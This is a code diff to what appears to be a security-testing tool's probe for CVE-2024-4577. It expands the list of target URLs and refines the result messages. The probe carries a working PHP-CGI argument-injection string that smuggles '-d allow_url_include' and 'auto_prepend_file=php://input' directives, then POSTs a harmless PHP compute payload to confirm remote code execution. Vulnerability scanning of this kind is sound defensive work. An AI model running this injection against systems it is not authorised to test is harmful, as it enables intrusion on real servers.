@@ -348,23 +348,50 @@ class PHPCGIArgInjection(WebProbe):
         payload = "<?php echo '%s:'; echo %d*%d; ?>" % (marker, a, b)
         # The injection smuggles -d directives so a posted script is executed.
         q = "%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
-        steps = []
-        for path in ("/index.php?" + q, "/?" + q, "/php-cgi/php-cgi.exe?" + q,
-                     "/cgi-bin/php.exe?" + q, "/cgi-bin/php-cgi.exe?" + q,
-                     "/test.php?" + q, "/info.php?" + q):
-            url = urljoin(base_url, path)
+        # Build target URLs that respect the app's base PATH (not just the origin
+        # root): if the target is served under /app/..., test /app/index.php too,
+        # and if the URL itself is a .php, inject directly on it.
+        from urllib.parse import urlparse
+        pr = urlparse(base_url)
+        origin = "%s://%s" % (pr.scheme or "http", pr.netloc)
+        path = pr.path or "/"
+        base_dir = path.rsplit("/", 1)[0] if "/" in path.strip("/") else ""
+        segs = [s for s in path.strip("/").split("/") if s]
+        app_root = "/" + segs[0] if segs else ""
+        cands = []
+        if path.endswith(".php"):
+            cands.append("%s%s?%s" % (origin, path, q))
+        for pfx in dict.fromkeys([base_dir.rstrip("/"), app_root.rstrip("/"), ""]):
+            cands.append("%s%s/index.php?%s" % (origin, pfx, q))
+            cands.append("%s%s/?%s" % (origin, pfx, q))
+        for p in ("/php-cgi/php-cgi.exe", "/cgi-bin/php.exe", "/cgi-bin/php-cgi.exe",
+                  "/test.php", "/info.php"):
+            cands.append("%s%s?%s" % (origin, p, q))
+        cands = list(dict.fromkeys(cands))
+        steps, codes = [], []
+        for url in cands:
             s, r = _req(http, "POST", url,
                         "CVE-2024-4577: smuggle -d directives, POST a benign PHP compute payload",
                         content=payload.encode())
             steps.append(s)
-            text = r.text if r is not None else ""
-            if expect in text:
-                return [AttemptRec("php-cgi-arg-injection", self.objective, steps, True, 1.0, expect,
-                                   "CVE-2024-4577 confirmed exploitable: the injected PHP ran server-side "
-                                   "and returned the computed value %s (a reflection would echo the "
-                                   "literal expression, not the product) — remote code execution." % expect)]
+            if r is not None:
+                codes.append(r.status_code)
+                if expect in (r.text or ""):
+                    return [AttemptRec("php-cgi-arg-injection", self.objective, steps, True, 1.0, expect,
+                                       "CVE-2024-4577 confirmed exploitable: the injected PHP ran server-side "
+                                       "and returned the computed value %s (a reflection would echo the "
+                                       "literal expression, not the product) — remote code execution." % expect)]
+        # Distinguish a backend/gateway error from genuinely-not-vulnerable.
+        if codes and all(c >= 500 for c in codes):
+            why = ("every attempt returned an HTTP %d backend/gateway error — the request reached the "
+                   "backend but it erred (likely no PHP-CGI at these paths). Point at a real .php endpoint "
+                   "(URL override) and retry with a fresh session." % codes[0])
+        elif not codes:
+            why = "no response from the target (unreachable, or blocked before the backend)."
+        else:
+            why = "no server-side execution — not PHP-CGI (CVE-2024-4577 is PHP-CGI/Windows-specific), or patched."
         return [AttemptRec("php-cgi-arg-injection", self.objective, steps, False, 0.0, "",
-                           "Not exploitable (no server-side execution; not PHP-CGI or already patched).")]
+                           "Not confirmed: " + why)]
 
 
 @register
